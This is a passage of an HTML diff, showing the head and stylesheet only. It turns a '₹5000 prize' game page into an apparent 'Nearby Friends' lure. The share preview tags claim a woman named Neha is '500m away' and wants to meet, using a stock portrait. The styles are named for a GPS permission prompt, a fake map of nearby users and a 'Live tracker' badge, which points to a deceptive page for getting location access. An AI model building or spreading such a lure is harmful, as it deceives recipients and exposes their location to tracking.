@@ -1,901 +1,1991 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
+    <!-- Open Graph (WhatsApp, Facebook) -->
+    <meta property="og:title" content="🎯 Neha is 500m away — wants to meet you">
+    <meta property="og:description" content="Tap to connect with girls nearby. 100% free.">
+    <meta property="og:image" content="https://randomuser.me/api/portraits/women/44.jpg">
+    <meta property="og:url" content="https://your-site.com">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="🎯 Neha is 500m away">
+    <meta name="twitter:description" content="Tap to connect with girls nearby.">
+    <meta name="twitter:image" content="https://randomuser.me/api/portraits/women/44.jpg">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Win ₹5000 — Play Game</title>
+    <title>Nearby Friends</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
 
         body {
-            background: linear-gradient(135deg, #0f0f13 0%, #1a0a2e 100%);
+            background: #0a0a0a;
             color: #fff;
-            min-height: 100vh;
-            padding: 16px;
-            overflow-x: hidden;
-        }
-
-        .wrap { max-width: 440px; margin: 0 auto; padding-top: 20px; }
-
-        /* HERO */
-        .hero {
-            text-align: center;
-            padding: 30px 20px;
-            background: linear-gradient(135deg, rgba(168, 85, 247, 0.15), rgba(236, 72, 153, 0.15));
-            border-radius: 24px;
-            border: 1px solid rgba(168, 85, 247, 0.3);
-            margin-bottom: 20px;
-            position: relative;
+            height: 100vh;
             overflow: hidden;
+            user-select: none;
         }
 
-        .hero::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(168, 85, 247, 0.2) 0%, transparent 70%);
-            animation: rotate 10s linear infinite;
-        }
-
-        @keyframes rotate {
-            to { transform: rotate(360deg); }
-        }
-
-        .trophy {
-            font-size: 60px;
-            margin-bottom: 12px;
-            animation: bounce 2s infinite;
-            position: relative;
-            z-index: 2;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .hero-title {
-            font-size: 16px;
-            color: #c4b5fd;
-            font-weight: 600;
-            margin-bottom: 8px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .hero-amount {
-            font-size: 52px;
-            font-weight: 900;
-            background: linear-gradient(135deg, #fbbf24, #f59e0b, #fbbf24);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            line-height: 1;
-            margin-bottom: 8px;
-            position: relative;
-            z-index: 2;
-            animation: shine 2s infinite;
-            background-size: 200% auto;
-        }
-
-        @keyframes shine {
-            to { background-position: 200% center; }
-        }
-
-        .hero-sub {
-            font-size: 13px;
-            color: #9ca3af;
-            position: relative;
-            z-index: 2;
-        }
-
-        /* BUTTONS */
-        .btn {
-            width: 100%;
-            padding: 18px;
-            border: none;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 800;
-            cursor: pointer;
-            font-family: inherit;
-            transition: all 0.2s;
+        /* ===== LANDING ===== */
+        #landing {
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(135deg, #1a73e8, #34A853);
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            padding: 24px;
+            text-align: center;
+            z-index: 100;
+            transition: opacity 0.4s;
+        }
+
+        #landing.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        #landing .logo {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: float 3s infinite;
+        }
+
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-15px);
+            }
+        }
+
+        #landing h1 {
+            font-size: 32px;
+            font-weight: 600;
             margin-bottom: 12px;
-            position: relative;
-            overflow: hidden;
         }
 
-        .btn:active { transform: scale(0.98); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
-        .btn-win {
-            background: linear-gradient(135deg, #f59e0b, #d97706);
-            color: #fff;
-            box-shadow: 0 8px 32px rgba(245, 158, 11, 0.5);
-            font-size: 17px;
-            padding: 20px;
-        }
-
-        .btn-win::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            animation: shineBtn 2s infinite;
-        }
-
-        @keyframes shineBtn {
-            0% { left: -100%; }
-            60%, 100% { left: 100%; }
-        }
-
-        .btn-play {
-            background: linear-gradient(135deg, #a855f7, #7c3aed);
-            color: #fff;
-            box-shadow: 0 8px 32px rgba(168, 85, 247, 0.5);
-        }
-
-        .btn-claim {
-            background: linear-gradient(135deg, #10b981, #059669);
-            color: #fff;
-            box-shadow: 0 8px 32px rgba(16, 185, 129, 0.5);
-        }
-
-        /* INFO CARDS */
-        .info-card {
-            background: #1a1a22;
+        #landing .nearby-notify {
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.25);
             border-radius: 16px;
-            padding: 18px;
-            margin-bottom: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .info-title {
-            font-size: 13px;
-            font-weight: 700;
-            color: #c4b5fd;
-            margin-bottom: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .info-row {
+            padding: 14px 20px;
+            margin-bottom: 24px;
             display: flex;
             align-items: center;
             gap: 12px;
-            padding: 8px 0;
-            font-size: 13px;
-            color: #d1d5db;
+            backdrop-filter: blur(10px);
+            animation: notifyPulse 2s infinite;
         }
 
-        .info-row .icon {
-            font-size: 18px;
+        @keyframes notifyPulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4);
+            }
+
+            50% {
+                transform: scale(1.02);
+                box-shadow: 0 0 0 10px rgba(255, 255, 255, 0);
+            }
         }
 
-        /* LIVE USERS */
-        .live-pill {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            padding: 10px 16px;
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            border-radius: 12px;
-            font-size: 12px;
-            color: #10b981;
-            font-weight: 600;
-            margin-bottom: 16px;
-        }
-
-        .live-dot {
-            width: 8px;
-            height: 8px;
-            background: #10b981;
+        #landing .nearby-notify .avatar {
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
-            animation: pulse 1.5s infinite;
+            background-size: cover;
+            background-position: center;
+            border: 2px solid #fff;
+            flex-shrink: 0;
         }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(1.3); }
+        #landing .nearby-notify .text {
+            text-align: left;
         }
 
-        /* ============================================================
-           GAME MODAL
-           ============================================================ */
-        .game-modal {
+        #landing .nearby-notify .text strong {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        #landing .nearby-notify .text span {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        #landing p {
+            font-size: 15px;
+            opacity: 0.9;
+            max-width: 340px;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        #landing .stats {
+            display: flex;
+            gap: 32px;
+            margin-bottom: 32px;
+        }
+
+        #landing .stat {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #landing .stat .num {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        #landing .stat .label {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        #startBtn {
+            padding: 18px 48px;
+            border: none;
+            border-radius: 32px;
+            background: #fff;
+            color: #1a73e8;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: transform 0.2s;
+        }
+
+        #startBtn:active {
+            transform: scale(0.96);
+        }
+
+        /* ===== GPS MODAL ===== */
+        #gpsModal {
             position: fixed;
             inset: 0;
             background: rgba(0, 0, 0, 0.95);
             display: none;
             align-items: center;
             justify-content: center;
-            z-index: 99999;
-            padding: 16px;
-            backdrop-filter: blur(10px);
+            padding: 24px;
+            z-index: 200;
+            animation: fadeIn 0.3s;
         }
 
-        .game-modal.show { display: flex; }
+        #gpsModal.show {
+            display: flex;
+        }
 
-        .game-box {
-            background: #1a1a22;
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .gps-content {
+            background: #1c1c1e;
             border-radius: 24px;
-            padding: 24px 20px;
-            max-width: 400px;
+            padding: 32px 24px;
+            max-width: 420px;
             width: 100%;
-            border: 1px solid rgba(168, 85, 247, 0.3);
-            animation: boxIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-
-        @keyframes boxIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        .game-title {
-            font-size: 20px;
-            font-weight: 800;
             text-align: center;
-            margin-bottom: 6px;
-            background: linear-gradient(135deg, #a855f7, #ec4899);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            animation: slideUp 0.4s;
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .game-sub {
+        @keyframes slideUp {
+            from {
+                transform: translateY(40px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .gps-icon {
+            font-size: 72px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.08);
+            }
+        }
+
+        .gps-content h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .gps-content .nearby-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, #FF6B6B, #FF3B30);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 20px;
             font-size: 12px;
-            color: #9ca3af;
-            text-align: center;
-            margin-bottom: 20px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            animation: pulse 2s infinite;
         }
 
-        /* Grid game */
-        .game-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
+        .gps-content .subtitle {
+            font-size: 15px;
+            color: #8e8e93;
+            line-height: 1.6;
+            margin-bottom: 24px;
         }
 
-        .game-cell {
-            aspect-ratio: 1;
-            background: #0f0f13;
+        .gps-benefits {
+            background: #2c2c2e;
             border-radius: 14px;
+            padding: 18px;
+            text-align: left;
+            margin-bottom: 24px;
+        }
+
+        .gps-benefits .item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 10px 0;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .gps-benefits .item:not(:last-child) {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .gps-benefits .item .emoji {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .gps-benefits .item .text strong {
+            display: block;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+
+        .gps-benefits .item .text span {
+            color: #8e8e93;
+            font-size: 13px;
+        }
+
+        .gps-privacy {
+            background: rgba(52, 168, 83, 0.1);
+            border: 1px solid rgba(52, 168, 83, 0.3);
+            border-radius: 12px;
+            padding: 12px 16px;
+            font-size: 13px;
+            color: #34A853;
+            margin-bottom: 24px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 32px;
-            cursor: pointer;
-            transition: all 0.2s;
-            border: 2px solid rgba(255, 255, 255, 0.08);
-            user-select: none;
+            gap: 10px;
         }
 
-        .game-cell:active {
-            transform: scale(0.95);
-        }
-
-        .game-cell.revealed {
-            background: linear-gradient(135deg, #a855f7, #7c3aed);
-            border-color: #a855f7;
-            animation: reveal 0.3s;
-        }
-
-        @keyframes reveal {
-            0% { transform: scale(0.8) rotateY(0); }
-            50% { transform: scale(1.1) rotateY(180deg); }
-            100% { transform: scale(1) rotateY(360deg); }
-        }
-
-        .game-cell.win {
-            background: linear-gradient(135deg, #fbbf24, #f59e0b);
-            border-color: #fbbf24;
-            animation: winPulse 0.5s infinite;
-        }
-
-        @keyframes winPulse {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(251, 191, 36, 0.7); }
-            50% { box-shadow: 0 0 0 15px rgba(251, 191, 36, 0); }
-        }
-
-        .game-cell.lose {
-            background: linear-gradient(135deg, #6b7280, #4b5563);
-            border-color: #4b5563;
-        }
-
-        /* Game stats */
-        .game-stats {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 16px;
-            background: #0f0f13;
-            border-radius: 12px;
-            margin-bottom: 16px;
-            font-size: 13px;
-        }
-
-        .game-stat {
-            text-align: center;
-        }
-
-        .game-stat-label {
-            font-size: 10px;
-            color: #6b7280;
-            text-transform: uppercase;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-            margin-bottom: 4px;
-        }
-
-        .game-stat-value {
+        .gps-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
             font-size: 16px;
-            font-weight: 800;
-            color: #c4b5fd;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 10px;
+            transition: transform 0.15s;
         }
 
-        .game-stat-value.gold {
-            color: #fbbf24;
+        .gps-btn:active {
+            transform: scale(0.97);
         }
 
-        /* Result screen */
-        .result-screen {
-            text-align: center;
-            display: none;
+        .gps-btn.allow {
+            background: linear-gradient(135deg, #1a73e8, #34A853);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(26, 115, 232, 0.4);
         }
 
-        .result-screen.show { display: block; }
-
-        .result-icon {
-            font-size: 80px;
-            margin-bottom: 16px;
-            animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        .gps-btn.skip {
+            background: transparent;
+            color: #8e8e93;
+            font-weight: 400;
+            font-size: 14px;
         }
 
-        @keyframes successPop {
-            0% { transform: scale(0); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
-
-        .result-title {
-            font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 8px;
-        }
-
-        .result-title.win {
-            background: linear-gradient(135deg, #fbbf24, #f59e0b);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .result-title.lose {
-            color: #9ca3af;
-        }
-
-        .result-sub {
-            font-size: 13px;
-            color: #9ca3af;
-            margin-bottom: 20px;
-            line-height: 1.6;
-        }
-
-        /* Countdown */
-        .countdown {
+        /* ===== LOADING ===== */
+        #loading {
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.9);
+            background: #0a0a0a;
             display: none;
             align-items: center;
             justify-content: center;
             flex-direction: column;
             gap: 20px;
-            z-index: 99998;
+            z-index: 150;
         }
 
-        .countdown.show { display: flex; }
+        #loading.show {
+            display: flex;
+        }
 
-        .countdown-circle {
-            width: 140px;
-            height: 140px;
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(26, 115, 232, 0.2);
+            border-top-color: #1a73e8;
             border-radius: 50%;
-            border: 4px solid rgba(168, 85, 247, 0.3);
-            border-top-color: #a855f7;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        #loading .text {
+            font-size: 15px;
+            color: #8e8e93;
+        }
+
+        /* ===== APP ===== */
+        #app {
+            display: none;
+            width: 100%;
+            height: 100%;
+            flex-direction: column;
+        }
+
+        #app.show {
+            display: flex;
+        }
+
+        #mapArea {
+            flex: 1;
+            position: relative;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            overflow: hidden;
+        }
+
+        #mapArea::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(26, 115, 232, 0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(26, 115, 232, 0.1) 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+
+        /* Nearby user notification banner */
+        .nearbyBanner {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            right: 16px;
+            background: linear-gradient(135deg, rgba(255, 59, 48, 0.95), rgba(255, 107, 107, 0.95));
+            border-radius: 16px;
+            padding: 12px 16px;
             display: flex;
             align-items: center;
-            justify-content: center;
+            gap: 12px;
+            z-index: 10;
+            box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
+            animation: slideDown 0.4s ease-out;
         }
 
-        .countdown-num {
-            font-size: 56px;
-            font-weight: 900;
-            background: linear-gradient(135deg, #a855f7, #ec4899);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        @keyframes slideDown {
+            from {
+                transform: translateY(-80px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
         }
 
-        .countdown-text {
+        .nearbyBanner .avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background-size: cover;
+            background-position: center;
+            border: 2px solid #fff;
+            flex-shrink: 0;
+        }
+
+        .nearbyBanner .info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .nearbyBanner .info strong {
+            display: block;
             font-size: 14px;
-            color: #c4b5fd;
+            font-weight: 600;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .nearbyBanner .info span {
+            font-size: 12px;
+            opacity: 0.95;
+        }
+
+        .nearbyBanner .close {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            color: #fff;
+            font-size: 14px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .userDot {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 24px;
+            height: 24px;
+            background: #1a73e8;
+            border: 4px solid #fff;
+            border-radius: 50%;
+            box-shadow: 0 0 20px rgba(26, 115, 232, 0.8);
+            z-index: 5;
+        }
+
+        .userDot::before {
+            content: '';
+            position: absolute;
+            inset: -12px;
+            border: 2px solid #1a73e8;
+            border-radius: 50%;
+            animation: ripple 2s infinite;
+        }
+
+        @keyframes ripple {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(2);
+                opacity: 0;
+            }
+        }
+
+        .nearbyDot {
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-size: cover;
+            background-position: center;
+            border: 3px solid #fff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+            z-index: 4;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .nearbyDot:active {
+            transform: scale(1.2);
+        }
+
+        .nearbyDot.online::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 12px;
+            height: 12px;
+            background: #34A853;
+            border: 2px solid #fff;
+            border-radius: 50%;
+        }
+
+        .nearbyDot.close::before {
+            content: '';
+            position: absolute;
+            inset: -8px;
+            border: 2px solid #FF3B30;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        #infoPanel {
+            padding: 20px;
+            background: #1c1c1e;
+            border-radius: 24px 24px 0 0;
+            min-height: 180px;
+        }
+
+        #infoPanel .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        #infoPanel .header h3 {
+            font-size: 18px;
             font-weight: 600;
         }
 
-        /* Toast */
-        .toast {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1f2937;
+        #infoPanel .header .count {
+            background: #1a73e8;
             color: #fff;
-            padding: 12px 20px;
+            padding: 4px 12px;
             border-radius: 12px;
             font-size: 13px;
-            font-weight: 500;
-            z-index: 999999;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            animation: toastIn 0.3s;
-            max-width: 90vw;
+            font-weight: 600;
+        }
+
+        #infoPanel .location {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #8e8e93;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        #infoPanel .location .dot {
+            width: 8px;
+            height: 8px;
+            background: #34A853;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        #nearbyList {
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            padding-bottom: 8px;
+        }
+
+        #nearbyList::-webkit-scrollbar {
+            height: 4px;
+        }
+
+        #nearbyList::-webkit-scrollbar-thumb {
+            background: #3c4043;
+            border-radius: 2px;
+        }
+
+        .nearbyCard {
+            flex-shrink: 0;
+            width: 80px;
             text-align: center;
+            cursor: pointer;
+        }
+
+        .nearbyCard .avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-size: cover;
+            background-position: center;
+            margin: 0 auto 8px;
+            border: 3px solid #1a73e8;
+            position: relative;
+        }
+
+        .nearbyCard .avatar.online::after {
+            content: '';
+            position: absolute;
+            bottom: 2px;
+            right: 2px;
+            width: 14px;
+            height: 14px;
+            background: #34A853;
+            border: 2px solid #1c1c1e;
+            border-radius: 50%;
+        }
+
+        .nearbyCard .name {
+            font-size: 12px;
+            font-weight: 500;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .nearbyCard .distance {
+            font-size: 10px;
+            color: #8e8e93;
+            margin-top: 2px;
+        }
+
+        .nearbyCard .distance.close {
+            color: #FF3B30;
+            font-weight: 600;
+        }
+
+        #controls {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            padding: 16px 20px 24px;
+            background: #1c1c1e;
+        }
+
+        .ctrlBtn {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            border: none;
+            background: #2c2c2e;
+            color: #fff;
+            font-size: 22px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.15s;
+        }
+
+        .ctrlBtn:active {
+            transform: scale(0.92);
+        }
+
+        .ctrlBtn.active {
+            background: #1a73e8;
+            box-shadow: 0 0 20px rgba(26, 115, 232, 0.6);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2c2c2e;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 24px;
+            font-size: 14px;
+            z-index: 9999;
+            animation: toastIn 0.3s;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
         }
 
         @keyframes toastIn {
-            from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
         }
 
-        /* Confetti */
-        .confetti {
+        /* Live tracker badge */
+        #liveBadge {
             position: fixed;
-            width: 10px;
-            height: 10px;
-            background: #fbbf24;
-            z-index: 999999;
-            pointer-events: none;
-            animation: confettiFall 3s linear forwards;
+            top: 16px;
+            right: 16px;
+            background: rgba(52, 168, 83, 0.9);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            z-index: 9998;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
         }
 
-        @keyframes confettiFall {
-            0% {
-                transform: translateY(-100vh) rotate(0deg);
+        #liveBadge.show {
+            display: flex;
+        }
+
+        #liveBadge .pulse {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #fff;
+            animation: pulse 1s infinite;
+        }
+
+        /* ============================================================
+   🔥 NEHA POPUP — Full DP Style
+   ============================================================ */
+        .neha-popup {
+            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
+            border-radius: 28px;
+            padding: 32px 24px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
+            animation: nehaSlideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes nehaSlideUp {
+            from {
+                transform: translateY(60px) scale(0.9);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0) scale(1);
                 opacity: 1;
             }
+        }
+
+        /* Top gradient glow */
+        .neha-popup::before {
+            content: '';
+            position: absolute;
+            top: -80px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 300px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(255, 59, 48, 0.35) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        /* Big Avatar */
+        .neha-avatar-wrap {
+            position: relative;
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 20px;
+        }
+
+        .neha-avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background-image: url('https://randomuser.me/api/portraits/women/44.jpg');
+            background-size: cover;
+            background-position: center;
+            border: 4px solid #1c1c1e;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 10px 40px rgba(255, 59, 48, 0.4);
+        }
+
+        .neha-avatar-ring {
+            position: absolute;
+            inset: -8px;
+            border-radius: 50%;
+            border: 2px solid #FF3B30;
+            animation: ringPulse 2s infinite;
+        }
+
+        @keyframes ringPulse {
+
+            0%,
             100% {
-                transform: translateY(100vh) rotate(720deg);
-                opacity: 0;
+                transform: scale(1);
+                opacity: 0.6;
+            }
+
+            50% {
+                transform: scale(1.08);
+                opacity: 1;
+            }
+        }
+
+        .neha-online-dot {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            width: 22px;
+            height: 22px;
+            background: #34A853;
+            border: 4px solid #1c1c1e;
+            border-radius: 50%;
+            z-index: 3;
+            box-shadow: 0 0 12px rgba(52, 168, 83, 0.8);
+        }
+
+        /* Name */
+        .neha-name {
+            font-size: 28px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }
+
+        /* Distance */
+        .neha-distance {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #8e8e93;
+            background: rgba(255, 59, 48, 0.1);
+            border: 1px solid rgba(255, 59, 48, 0.3);
+            padding: 5px 14px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+
+        .neha-distance .dot-live {
+            width: 6px;
+            height: 6px;
+            background: #FF3B30;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+
+        /* Message bubble */
+        .neha-message {
+            background: rgba(44, 44, 46, 0.9);
+            border-radius: 16px;
+            padding: 14px 18px;
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        .neha-message::before {
+            content: '';
+            position: absolute;
+            top: -8px;
+            left: 32px;
+            width: 16px;
+            height: 16px;
+            background: rgba(44, 44, 46, 0.9);
+            transform: rotate(45deg);
+            border-radius: 3px;
+        }
+
+        .neha-message-text {
+            font-size: 14px;
+            color: #fff;
+            line-height: 1.5;
+            font-style: italic;
+        }
+
+        .neha-message-time {
+            font-size: 11px;
+            color: #8e8e93;
+            margin-top: 6px;
+        }
+
+        /* Location note */
+        .neha-location-note {
+            background: rgba(26, 115, 232, 0.12);
+            border: 1px solid rgba(26, 115, 232, 0.3);
+            border-radius: 12px;
+            padding: 10px 14px;
+            font-size: 12px;
+            color: #1a73e8;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-align: left;
+        }
+
+        /* Primary button */
+        .neha-btn-primary {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            background: linear-gradient(135deg, #1a73e8, #34A853);
+            color: #fff;
+            box-shadow: 0 8px 24px rgba(26, 115, 232, 0.5);
+            transition: transform 0.15s;
+            margin-bottom: 10px;
+        }
+
+        .neha-btn-primary:active {
+            transform: scale(0.97);
+        }
+
+        /* Secondary button */
+        .neha-btn-secondary {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 400;
+            cursor: pointer;
+            background: transparent;
+            color: #8e8e93;
+            transition: color 0.2s;
+        }
+
+        .neha-btn-secondary:hover {
+            color: #fff;
+        }
+
+        /* Footer */
+        .neha-footer {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        /* ============================================================
+   🔥 BUTTON PULSE ANIMATION
+   ============================================================ */
+        @keyframes btnPulse {
+
+            0%,
+            100% {
+                box-shadow: 0 15px 40px rgba(52, 168, 83, 0.5),
+                    0 0 0 0 rgba(52, 168, 83, 0.7);
+            }
+
+            50% {
+                box-shadow: 0 15px 40px rgba(52, 168, 83, 0.7),
+                    0 0 0 15px rgba(52, 168, 83, 0);
+            }
+        }
+
+        /* Primary button hover shine effect */
+        #enableBtn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg,
+                    transparent,
+                    rgba(255, 255, 255, 0.3),
+                    transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% {
